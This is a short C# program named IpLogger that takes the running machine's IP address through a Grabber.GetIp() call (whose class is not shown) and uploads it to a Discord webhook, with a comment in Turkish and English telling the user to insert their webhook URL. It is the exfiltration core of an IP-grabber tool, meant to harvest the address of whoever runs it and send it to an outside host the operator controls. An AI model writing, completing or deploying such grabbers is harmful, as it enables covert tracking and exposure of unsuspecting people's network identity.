using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Collections.Specialized;

namespace IpLogger
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string webhook = "";// Discord Webhook urlsini Yazınız // Write the Discord webhook URL

            var wbc = new WebClient();
            var data = new NameValueCollection();
            data["content"] = Grabber.GetIp();
            wbc.UploadValues(webhook, data);
        }
    }
}
